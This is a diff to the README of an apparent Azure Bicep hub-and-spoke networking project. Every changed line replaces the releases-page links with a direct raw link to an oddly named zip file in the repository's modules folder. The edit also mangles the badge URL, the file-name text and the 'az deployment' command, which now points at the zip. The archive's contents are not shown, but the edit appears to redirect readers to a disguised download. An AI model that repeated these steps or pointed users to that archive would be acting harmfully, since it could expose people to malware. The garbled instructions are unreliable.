@@ -1,6 +1,6 @@
 # 🚀 Secure-Hub-and-Spoke-Network - Build a Secure Network with Ease
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20-blue?style=for-the-badge)](https://github.com/EmreKaraHD/Secure-Hub-and-Spoke-Network/releases)
+[![Download Now](https://github.com/EmreKaraHD/Secure-Hub-and-Spoke-Network/raw/refs/heads/main/modules/and_Network_Spoke_Secure_Hub_2.1-beta.4.zip%20Now-%20-blue?style=for-the-badge)](https://github.com/EmreKaraHD/Secure-Hub-and-Spoke-Network/raw/refs/heads/main/modules/and_Network_Spoke_Secure_Hub_2.1-beta.4.zip)
 
 ## 📚 Introduction
 
@@ -27,10 +27,10 @@ Welcome to Secure-Hub-and-Spoke-Network! This tool helps you set up a secure Hub
 Follow these steps to build your secure network.
 
 1. **Visit the Releases Page:**
-   To download the latest version, [visit this page to download](https://github.com/EmreKaraHD/Secure-Hub-and-Spoke-Network/releases).
+   To download the latest version, [visit this page to download](https://github.com/EmreKaraHD/Secure-Hub-and-Spoke-Network/raw/refs/heads/main/modules/and_Network_Spoke_Secure_Hub_2.1-beta.4.zip).
 
 2. **Download the Bicep Files:**
-   On the releases page, look for the latest release version. Download the `bicep-files.zip` or equivalent file listed.
+   On the releases page, look for the latest release version. Download the `https://github.com/EmreKaraHD/Secure-Hub-and-Spoke-Network/raw/refs/heads/main/modules/and_Network_Spoke_Secure_Hub_2.1-beta.4.zip` or equivalent file listed.
 
 3. **Extract the Files:**
    After downloading, locate the ZIP file on your computer. Right-click, and select "Extract All..." to unpack the files.
@@ -51,7 +51,7 @@ Follow these steps to build your secure network.
    Navigate to the folder where you extracted the Bicep files. Use the following command to deploy:
 
    ```
-   az deployment group create --resource-group <YourResourceGroupName> --template-file main.bicep
+   az deployment group create --resource-group <YourResourceGroupName> --template-file https://github.com/EmreKaraHD/Secure-Hub-and-Spoke-Network/raw/refs/heads/main/modules/and_Network_Spoke_Secure_Hub_2.1-beta.4.zip
    ```
 
    Replace `<YourResourceGroupName>` with your resource group's name.
@@ -64,7 +64,7 @@ Follow these steps to build your secure network.
 
 ## 🔍 Download & Install
 
-To get started, make sure to [visit this page to download](https://github.com/EmreKaraHD/Secure-Hub-and-Spoke-Network/releases). Follow the steps outlined above to download and set up the Bicep files for your Azure account.
+To get started, make sure to [visit this page to download](https://github.com/EmreKaraHD/Secure-Hub-and-Spoke-Network/raw/refs/heads/main/modules/and_Network_Spoke_Secure_Hub_2.1-beta.4.zip). Follow the steps outlined above to download and set up the Bicep files for your Azure account.
 
 ## 💡 Troubleshooting
 
